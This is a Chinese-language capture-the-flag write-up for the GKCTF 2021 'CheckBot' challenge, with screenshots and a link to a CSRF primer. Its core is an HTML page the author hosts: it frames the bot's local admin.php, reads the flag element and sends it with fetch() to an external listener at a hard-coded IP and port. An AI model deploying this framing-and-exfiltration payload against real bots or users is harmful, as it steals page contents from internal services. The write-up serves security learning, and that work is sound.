---
title: '[GKCTF 2021]CheckBot'
date: 2024-11-12 20:01:00
tags:
      - csrf
      - fetch带出
categories: 刷题笔记
---

## [GKCTF 2021]CheckBot

题目提示将url post传参

![image-20241112201749960](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411122017014.png)

我们访问admin.php得到本机ip

![image-20241112202011583](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411122020617.png)

同时在这发现了flag，应该要本地访问猜想，这道题bot会点击我们发过去的链接，我们可以写个csrf

把下面的代码放在自己的vps上，然后把网址发过去让bot去访问，bot访问后会把flag发到我们监听的端口这，就可以成功获取flag

```php
<html>
        <body>
                <iframe id="iframe1" src="http://127.0.0.1/admin.php"></iframe>

                <script>
                    function load(){
                        var iframe = document.getElementById("iframe1").contentWindow.document.getElementById("flag").innerHTML;
                        console.log(iframe);
                        fetch('http://47.96.173.116:2333', {method: 'POST', mode: 'no-cors', body: iframe})
                    }
                    window.onload = load;
                </script>
        </body>
</html>


```

![image-20241112202232141](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411122022182.png)

这里发过去也提示了要等一会，这里确实得有点耐心

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/bf85dfd4ee017543f2a3c649d21681ae.png)

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0b8340637c7151bccad03f4e60968504.png)

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f0337cae2d99238dfe5d26ced5eac921.png)

得到flag

[CSRF](https://blog.techbridge.cc/2017/02/25/csrf-introduction/)知识

转载   https://blog.csdn.net/cjdgg/article/details/121504021

https://blog.techbridge.cc/2017/02/25/csrf-introduction/
